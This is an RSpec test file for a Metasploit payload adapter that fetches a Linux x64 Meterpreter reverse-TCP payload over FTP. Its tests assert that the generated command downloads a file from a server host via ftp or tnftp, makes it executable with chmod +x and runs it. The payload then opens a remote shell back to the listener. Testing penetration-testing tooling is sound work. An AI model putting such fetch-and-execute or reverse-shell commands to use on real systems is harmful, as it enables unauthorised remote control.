require 'rspec'

RSpec.describe 'cmd/linux/ftp/x64' do
  include_context 'Msf::Simple::Framework#modules loading'

  let(:subject) do
    load_and_create_module(
      module_type: 'payload',
      reference_name: 'cmd/linux/ftp/x64/meterpreter_reverse_tcp',
      ancestor_reference_names: [
        'adapters/cmd/linux/ftp/x64',
        'singles/linux/x64/meterpreter_reverse_tcp'
      ]
    )
  end

  let(:lhost)           { '192.168.1.100' }
  let(:lport)           { '4444' }
  let(:fetch_srvhost)   { '192.168.1.100' }
  let(:fetch_srvport)   { 4501 }
  let(:fetch_uripath)   { 'testpayload' }
  let(:fetch_filename)  { 'payload' }
  let(:fetch_writable_dir) { './' }

  let(:datastore_values) do
    {
      'LHOST'              => lhost,
      'LPORT'              => lport,
      'FETCH_SRVHOST'      => fetch_srvhost,
      'FETCH_SRVPORT'      => fetch_srvport,
      'FETCH_URIPATH'      => fetch_uripath,
      'FETCH_FILENAME'     => fetch_filename,
      'FETCH_WRITABLE_DIR' => fetch_writable_dir,
      'FETCH_FILELESS'     => 'none',
      'FETCH_PIPE'         => false,
      'FETCH_SRVONCE'      => false
    }
  end

  before(:each) { subject.datastore.merge!(datastore_values) }

  # ---------------------------------------------------------------------------
  # Module metadata
  # ---------------------------------------------------------------------------

  describe 'module metadata' do
    it 'includes FTP Fetch in the name' do
      expect(subject.name).to include('FTP Fetch')
    end

    it 'targets the Linux platform' do
      expect(subject.platform.platforms).to include(Msf::Module::Platform::Linux)
    end

    it 'uses CMD arch' do
      expect(subject.arch).to include(ARCH_CMD)
    end

    it 'adapts x64 payloads' do
      expect(subject.send(:module_info)['AdaptedArch']).to eq(ARCH_X64)
    end

    it 'has linux as the adapted platform' do
      expect(subject.send(:module_info)['AdaptedPlatform']).to eq('linux')
    end
  end

  # ---------------------------------------------------------------------------
  # Protocol and platform helpers
  # ---------------------------------------------------------------------------

  describe '#fetch_protocol' do
    it 'returns FTP' do
      expect(subject.fetch_protocol).to eq('FTP')
    end
  end

  describe '#windows?' do
    it 'returns false for this Linux module' do
      expect(subject.windows?).to be(false)
    end
  end

  # ---------------------------------------------------------------------------
  # FETCH_COMMAND option
  # ---------------------------------------------------------------------------

  describe 'FETCH_COMMAND option' do
    it 'defaults to CURL' do
      fresh = load_and_create_module(
        module_type: 'payload',
        reference_name: 'cmd/linux/ftp/x64/meterpreter_reverse_tcp',
        ancestor_reference_names: [
          'adapters/cmd/linux/ftp/x64',
          'singles/linux/x64/meterpreter_reverse_tcp'
        ]
      )
      expect(fresh.datastore['FETCH_COMMAND']).to eq('CURL')
    end

    # All LinuxOptions commands are syntactically valid; FTP/TNFTP are the only
    # ones that actually work with an FTP server at runtime.
    %w[CURL WGET TNFTP FTP GET TFTP].each do |cmd|
      it "accepts #{cmd} as a valid enum value" do
        expect(subject.options['FETCH_COMMAND'].valid?(cmd)).to be(true)
      end
    end

    it 'rejects CERTUTIL as an invalid value' do
      expect(subject.options['FETCH_COMMAND'].valid?('CERTUTIL')).to be(false)
    end
  end

  # ---------------------------------------------------------------------------
  # generate_fetch_commands — only FTP and TNFTP are compatible with the FTP
  # protocol; other commands raise at runtime.
  # ---------------------------------------------------------------------------

  describe '#generate_fetch_commands' do
    context 'with FTP' do
      before { subject.datastore['FETCH_COMMAND'] = 'FTP' }

      it 'uses ftp -Vo to download' do
        expect(subject.generate_fetch_commands).to include('ftp -Vo')
      end

      it 'includes the FTP URL with host, port, and URI path' do
        expect(subject.generate_fetch_commands).to include(
          "ftp://#{fetch_srvhost}:#{fetch_srvport}/#{fetch_uripath}"
        )
      end

      it 'makes the file executable and runs it' do
        cmd = subject.generate_fetch_commands
        expect(cmd).to include('chmod +x')
        expect(cmd).to include("#{fetch_writable_dir}#{fetch_filename}&")
      end
    end

    context 'with TNFTP' do
      before { subject.datastore['FETCH_COMMAND'] = 'TNFTP' }

      it 'uses tnftp -Vo to download' do
        expect(subject.generate_fetch_commands).to include('tnftp -Vo')
      end

      it 'includes the FTP URL with host, port, and URI path' do
        expect(subject.generate_fetch_commands).to include(
          "ftp://#{fetch_srvhost}:#{fetch_srvport}/#{fetch_uripath}"
        )
      end

      it 'makes the file executable and runs it' do
        cmd = subject.generate_fetch_commands
        expect(cmd).to include('chmod +x')
        expect(cmd).to include("#{fetch_writable_dir}#{fetch_filename}&")
      end
    end
  end
end
